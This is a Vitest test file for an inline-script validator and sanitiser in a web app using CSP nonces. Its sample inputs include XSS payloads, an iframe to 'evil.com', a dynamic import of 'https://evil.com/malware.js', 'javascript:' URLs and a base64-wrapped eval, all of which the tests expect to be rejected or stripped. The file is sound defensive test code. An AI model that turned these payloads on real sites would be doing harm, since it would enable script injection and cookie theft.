/**
 * SAHOOL Nonce Security Validation Tests
 * اختبارات التحقق الأمني لـ Nonce
 *
 * Tests for the inline script validation functionality
 */

import { vi } from "vitest";
import { validateScriptCode, createInlineScript } from "../nonce";

// ═══════════════════════════════════════════════════════════════════════════
// Validation Tests
// ═══════════════════════════════════════════════════════════════════════════

describe("validateScriptCode", () => {
  describe("Safe code patterns", () => {
    it("should pass validation for safe console.log", () => {
      const result = validateScriptCode('console.log("Hello World")');
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it("should pass validation for safe variable assignment", () => {
      const result = validateScriptCode(
        'window.__APP_CONFIG__ = { apiUrl: "/api" }',
      );
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it("should pass validation for safe function calls", () => {
      const result = validateScriptCode("initializeApp(); startMonitoring();");
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });
  });

  describe("Dangerous code patterns", () => {
    it("should fail validation for eval()", () => {
      const result = validateScriptCode('eval("malicious code")');
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
      expect(result.errors[0]).toContain("eval");
    });

    it("should fail validation for Function constructor", () => {
      const result = validateScriptCode('new Function("return 1")()');
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
      expect(result.errors[0]).toContain("Function");
    });

    it("should fail validation for script tag injection", () => {
      const result = validateScriptCode('<script>alert("XSS")</script>');
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });

    it("should fail validation for innerHTML assignment", () => {
      const result = validateScriptCode("element.innerHTML = userInput");
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
      expect(result.errors[0]).toContain("innerHTML");
    });

    it("should fail validation for javascript: protocol", () => {
      const result = validateScriptCode(
        'location.href = "javascript:alert(1)"',
      );
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });

    it("should fail validation for inline event handlers", () => {
      const result = validateScriptCode('<div onclick="malicious()"></div>');
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });

    it("should fail validation for iframe injection", () => {
      const result = validateScriptCode('<iframe src="evil.com"></iframe>');
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });

    it("should fail validation for document.write", () => {
      const result = validateScriptCode(
        'document.write("<script>evil</script>")',
      );
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });

    it("should fail validation for dynamic imports", () => {
      const result = validateScriptCode(
        'import("https://evil.com/malware.js")',
      );
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });
  });

  describe("Suspicious but potentially legitimate patterns", () => {
    it("should warn for localStorage usage", () => {
      const result = validateScriptCode('localStorage.setItem("key", "value")');
      expect(result.isValid).toBe(true);
      expect(result.warnings.length).toBeGreaterThan(0);
      expect(result.warnings[0]).toContain("localStorage");
    });

    it("should warn for fetch calls", () => {
      const result = validateScriptCode('fetch("/api/data")');
      expect(result.isValid).toBe(true);
      expect(result.warnings.length).toBeGreaterThan(0);
      expect(result.warnings[0]).toContain("fetch");
    });

    it("should warn for cookie access", () => {
      const result = validateScriptCode("const token = document.cookie");
      expect(result.isValid).toBe(true);
      expect(result.warnings.length).toBeGreaterThan(0);
      expect(result.warnings[0]).toContain("cookie");
    });

    it("should warn for window.location usage", () => {
      const result = validateScriptCode("window.location.pathname");
      expect(result.isValid).toBe(true);
      expect(result.warnings.length).toBeGreaterThan(0);
      expect(result.warnings[0]).toContain("location");
    });

    it("should warn for template literals", () => {
      const result = validateScriptCode("const str = `Hello ${name}`");
      expect(result.isValid).toBe(true);
      expect(result.warnings.length).toBeGreaterThan(0);
      expect(result.warnings[0]).toContain("Template literals");
    });
  });

  describe("Edge cases", () => {
    it("should fail for empty string", () => {
      const result = validateScriptCode("");
      expect(result.isValid).toBe(false);
      expect(result.errors[0]).toContain("non-empty string");
    });

    it("should fail for non-string input", () => {
      const result = validateScriptCode(null as any);
      expect(result.isValid).toBe(false);
      expect(result.errors[0]).toContain("non-empty string");
    });
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// createInlineScript Integration Tests
// ═══════════════════════════════════════════════════════════════════════════

describe("createInlineScript", () => {
  const mockNonce = "test-nonce-123";

  describe("With validation enabled (default)", () => {
    it("should create inline script for safe code", () => {
      const result = createInlineScript('console.log("test")', mockNonce);
      expect(result).toHaveProperty("nonce", mockNonce);
      expect(result).toHaveProperty("dangerouslySetInnerHTML");
      expect(result.dangerouslySetInnerHTML.__html).toBe('console.log("test")');
    });

    it("should throw in production for dangerous code", () => {
      const originalEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = "production";

      expect(() => {
        createInlineScript('eval("dangerous")', mockNonce);
      }).toThrow("Inline script validation failed");

      process.env.NODE_ENV = originalEnv;
    });

    it("should allow dangerous code in development without throwing", () => {
      const originalEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = "development";

      // In development, dangerous code is allowed (for debugging) but logged
      expect(() => {
        createInlineScript('eval("dangerous")', mockNonce);
      }).not.toThrow();

      process.env.NODE_ENV = originalEnv;
    });
  });

  describe("With validation skipped", () => {
    it("should allow dangerous code when skipValidation is true", () => {
      const result = createInlineScript('eval("dangerous")', mockNonce, {
        skipValidation: true,
      });
      expect(result).toHaveProperty("nonce", mockNonce);
      expect(result.dangerouslySetInnerHTML.__html).toBe('eval("dangerous")');
    });
  });

  describe("With sanitization enabled", () => {
    it("should sanitize script tags before validation", () => {
      const result = createInlineScript(
        'console.log("safe"); <script>alert("XSS")</script>',
        mockNonce,
        { allowSanitization: true },
      );
      expect(result.dangerouslySetInnerHTML.__html).not.toContain("<script>");
      expect(result.dangerouslySetInnerHTML.__html).toContain(
        'console.log("safe")',
      );
    });

    it("should sanitize iframe tags", () => {
      const result = createInlineScript(
        'console.log("safe"); <iframe src="evil.com"></iframe>',
        mockNonce,
        { allowSanitization: true },
      );
      expect(result.dangerouslySetInnerHTML.__html).not.toContain("<iframe");
    });

    it("should sanitize javascript: protocol", () => {
      const result = createInlineScript(
        'const safe = "data"; javascript:alert(1)',
        mockNonce,
        { allowSanitization: true },
      );
      expect(result.dangerouslySetInnerHTML.__html).not.toContain(
        "javascript:",
      );
    });
  });

  describe("With null nonce", () => {
    it("should work without nonce", () => {
      const result = createInlineScript('console.log("test")', null);
      expect(result).not.toHaveProperty("nonce");
      expect(result).toHaveProperty("dangerouslySetInnerHTML");
    });
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// Real-world Usage Examples
// ═══════════════════════════════════════════════════════════════════════════

describe("Real-world scenarios", () => {
  const mockNonce = "test-nonce-abc";

  it("should allow safe app configuration", () => {
    const configScript = `
      window.__APP_CONFIG__ = {
        apiUrl: '/api',
        version: '16.0.0',
        locale: 'ar'
      };
    `;
    const result = createInlineScript(configScript, mockNonce);
    expect(result).toHaveProperty("nonce");
  });

  it("should allow safe analytics initialization", () => {
    const analyticsScript = `
      (function() {
        window.analytics = {
          track: function(event) {
            console.log('Track:', event);
          }
        };
      })();
    `;
    const result = createInlineScript(analyticsScript, mockNonce);
    expect(result).toHaveProperty("nonce");
  });

  it("should reject user-provided code", () => {
    const originalEnv = process.env.NODE_ENV;
    process.env.NODE_ENV = "production";

    // Simulate user input with XSS attempt
    const userInput = "<script>alert(document.cookie)</script>";

    expect(() => {
      createInlineScript(userInput, mockNonce);
    }).toThrow();

    process.env.NODE_ENV = originalEnv;
  });

  it("should reject code with eval from untrusted source", () => {
    const originalEnv = process.env.NODE_ENV;
    process.env.NODE_ENV = "production";

    const untrustedCode = 'eval(atob("ZG9jdW1lbnQud3JpdGU="))'; // Base64 encoded dangerous code

    expect(() => {
      createInlineScript(untrustedCode, mockNonce);
    }).toThrow();

    process.env.NODE_ENV = originalEnv;
  });
});
